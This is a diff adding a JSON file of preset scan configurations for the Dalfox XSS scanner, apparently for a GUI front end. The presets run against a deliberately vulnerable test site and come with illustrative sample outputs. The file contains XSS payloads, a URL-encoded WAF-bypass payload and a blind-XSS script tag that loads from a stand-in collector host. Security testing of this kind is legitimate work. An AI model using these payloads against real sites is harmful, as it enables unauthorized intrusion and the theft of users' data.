@@ -1,0 +1,112 @@
+[
+    {
+        "name": "Basic Scan (GET)",
+        "description": "Performs a basic Dalfox scan on a URL with GET parameters.",
+        "options": {
+            "url_entry": "http://testphp.vulnweb.com/listproducts.php?cat=1"
+        },
+        "example_output": "INFO: Starting Dalfox...\nINFO: Target: http://testphp.vulnweb.com/listproducts.php?cat=1\nINFO: [GET] http://testphp.vulnweb.com/listproducts.php?cat=1 - Payload: <script>alert(1)</script>\n[VULNERABLE] http://testphp.vulnweb.com/listproducts.php?cat=1 - Payload: <script>alert(1)</script> - Reflected: <script>alert(1)</script>\nINFO: Scan completed. Found 1 XSS vulnerability."
+    },
+    {
+        "name": "Basic Scan (POST)",
+        "description": "Performs a Dalfox scan on a URL with POST data.",
+        "options": {
+            "url_entry": "http://testphp.vulnweb.com/login.php",
+            "data_entry": "username=test&password=test"
+        },
+        "example_output": "INFO: Starting Dalfox...\nINFO: Target: http://testphp.vulnweb.com/login.php\nINFO: [POST] http://testphp.vulnweb.com/login.php - Data: username=test&password=<script>alert(1)</script>\n[VULNERABLE] http://testphp.vulnweb.com/login.php - Payload: <script>alert(1)</script> - Reflected: <script>alert(1)</script>\nINFO: Scan completed. Found 1 XSS vulnerability."
+    },
+    {
+        "name": "Scan from List File",
+        "description": "Scans multiple URLs from a specified file.",
+        "options": {
+            "list_file_entry": "urls.txt",
+            "output_file_entry": "dalfox_list_output.txt"
+        },
+        "example_output": "INFO: Starting Dalfox...\nINFO: Loading URLs from urls.txt\nINFO: [GET] http://example.com/search?q=test\n[VULNERABLE] http://example.com/search?q=test - Payload: <script>alert(1)</script>\nINFO: [GET] http://another.com/param?id=1\nINFO: No XSS found on http://another.com/param?id=1\nINFO: Scan completed. Found 1 XSS vulnerability. Output saved to dalfox_list_output.txt"
+    },
+    {
+        "name": "Blind XSS Scan",
+        "description": "Enables blind XSS detection with default blind XSS server.",
+        "options": {
+            "url_entry": "http://testphp.vulnweb.com/guestbook.php",
+            "blind_xss_var": true
+        },
+        "example_output": "INFO: Starting Dalfox...\nINFO: Target: http://testphp.vulnweb.com/guestbook.php\nINFO: Blind XSS enabled. Using default blind XSS server.\nINFO: [POST] http://testphp.vulnweb.com/guestbook.php - Payload: <script src=\"//blindxss.example.com/collector?id=xyz\"></script>\nINFO: Waiting for blind XSS callback...\n[VULNERABLE] Blind XSS triggered! Check your blind XSS server.\nINFO: Scan completed. Found 1 Blind XSS vulnerability."
+    },
+    {
+        "name": "Custom Payload Scan",
+        "description": "Uses a specific custom XSS payload for the scan.",
+        "options": {
+            "url_entry": "http://testphp.vulnweb.com/listproducts.php?cat=1",
+            "payload_entry": "<img src=x onerror=alert(document.domain)>",
+            "custom_payload_var": true
+        },
+        "example_output": "INFO: Starting Dalfox...\nINFO: Target: http://testphp.vulnweb.com/listproducts.php?cat=1\nINFO: Using custom payload: <img src=x onerror=alert(document.domain)>\n[VULNERABLE] http://testphp.vulnweb.com/listproducts.php?cat=1 - Payload: <img src=x onerror=alert(document.domain)> - Reflected: <img src=x onerror=alert(document.domain)>\nINFO: Scan completed. Found 1 XSS vulnerability."
+    },
+    {
+        "name": "Payloads from File",
+        "description": "Loads multiple XSS payloads from a file.",
+        "options": {
+            "url_entry": "http://testphp.vulnweb.com/listproducts.php?cat=1",
+            "payload_file_entry": "my_payloads.txt"
+        },
+        "example_output": "INFO: Starting Dalfox...\nINFO: Target: http://testphp.vulnweb.com/listproducts.php?cat=1\nINFO: Loading payloads from my_payloads.txt\nINFO: [GET] http://testphp.vulnweb.com/listproducts.php?cat=1 - Payload: <script>alert(1)</script>\n[VULNERABLE] http://testphp.vulnweb.com/listproducts.php?cat=1 - Payload: <script>alert(1)</script>\nINFO: [GET] http://testphp.vulnweb.com/listproducts.php?cat=1 - Payload: <svg onload=alert(1)>\nINFO: No reflection for <svg onload=alert(1)>\nINFO: Scan completed. Found 1 XSS vulnerability."
+    },
+    {
+        "name": "Scan with Custom Headers & Cookie",
+        "description": "Sends custom HTTP headers and a cookie with requests.",
+        "options": {
+            "url_entry": "http://testphp.vulnweb.com/index.php",
+            "header_entry": "X-Forwarded-For: 127.0.0.1\nReferer: http://google.com",
+            "cookie_entry": "sessionid=abcd123"
+        },
+        "example_output": "INFO: Starting Dalfox...\nINFO: Target: http://testphp.vulnweb.com/index.php\nINFO: [GET] http://testphp.vulnweb.com/index.php - Headers: X-Forwarded-For: 127.0.0.1, Referer: http://google.com, Cookie: sessionid=abcd123\nINFO: No XSS found.\nINFO: Scan completed."
+    },
+    {
+        "name": "Scan with Proxy",
+        "description": "Routes all Dalfox traffic through a specified HTTP/SOCKS proxy.",
+        "options": {
+            "url_entry": "http://testphp.vulnweb.com/artists.php?artist=1",
+            "proxy_entry": "http://127.0.0.1:8080"
+        },
+        "example_output": "INFO: Starting Dalfox...\nINFO: Target: http://testphp.vulnweb.com/artists.php?artist=1\nINFO: Using proxy: http://127.0.0.1:8080\nINFO: [GET] http://testphp.vulnweb.com/artists.php?artist=1 - Payload: <script>alert(1)</script>\n[VULNERABLE] http://testphp.vulnweb.com/artists.php?artist=1 - Payload: <script>alert(1)</script> - Reflected: <script>alert(1)</script>\nINFO: Scan completed. Found 1 XSS vulnerability."
+    },
+    {
+        "name": "WAF Bypass Scan",
+        "description": "Attempts to bypass Web Application Firewalls (WAFs) during the scan.",
+        "options": {
+            "url_entry": "http://waf.example.com/search?q=test",
+            "waf_bypass_var": true
+        },
+        "example_output": "INFO: Starting Dalfox...\nINFO: Target: http://waf.example.com/search?q=test\nINFO: WAF bypass enabled.\nINFO: [GET] http://waf.example.com/search?q=test - Payload: %22%3E%3Cscript%3Ealert(1)%3C/script%3E\n[VULNERABLE] http://waf.example.com/search?q=test - Payload: %22%3E%3Cscript%3Ealert(1)%3C/script%3E - Reflected: \"><script>alert(1)</script>\nINFO: Scan completed. Found 1 XSS vulnerability."
+    },
+    {
+        "name": "Scan Only Specific Parameter",
+        "description": "Focuses the scan only on a named parameter.",
+        "options": {
+            "url_entry": "http://testphp.vulnweb.com/listproducts.php?cat=1&id=2",
+            "only_param_entry": "cat"
+        },
+        "example_output": "INFO: Starting Dalfox...\nINFO: Target: http://testphp.vulnweb.com/listproducts.php?cat=1&id=2\nINFO: Scanning only parameter: cat\nINFO: [GET] http://testphp.vulnweb.com/listproducts.php?cat=<script>alert(1)</script>&id=2\n[VULNERABLE] http://testphp.vulnweb.com/listproducts.php?cat=<script>alert(1)</script>&id=2 - Payload: <script>alert(1)</script> - Reflected: <script>alert(1)</script>\nINFO: Scan completed. Found 1 XSS vulnerability."
+    },
+    {
+        "name": "Verbose and Debug Output",
+        "description": "Increases verbosity and enables debug mode for detailed logging.",
+        "options": {
+            "url_entry": "http://testphp.vulnweb.com/index.php",
+            "verbose_var": true,
+            "debug_var": true
+        },
+        "example_output": "DEBUG: Dalfox version v2.x.x\nINFO: Starting Dalfox...\nINFO: Target: http://testphp.vulnweb.com/index.php\nDEBUG: Sending request to http://testphp.vulnweb.com/index.php\nDEBUG: Response status: 200\nINFO: No XSS found.\nINFO: Scan completed."
+    },
+    {
+        "name": "High Concurrency Scan",
+        "description": "Sets a higher number of concurrent requests for faster scanning.",
+        "options": {
+            "url_entry": "http://testphp.vulnweb.com/listproducts.php?cat=1",
+            "concurrency_entry": "50"
+        },
+        "example_output": "INFO: Starting Dalfox...\nINFO: Target: http://testphp.vulnweb.com/listproducts.php?cat=1\nINFO: Concurrency set to 50.\nINFO: [GET] http://testphp.vulnweb.com/listproducts.php?cat=1 - Payload: <script>alert(1)</script>\n[VULNERABLE] http://testphp.vulnweb.com/listproducts.php?cat=1 - Payload: <script>alert(1)</script> - Reflected: <script>alert(1)</script>\nINFO: Scan completed. Found 1 XSS vulnerability."
+    }
+]
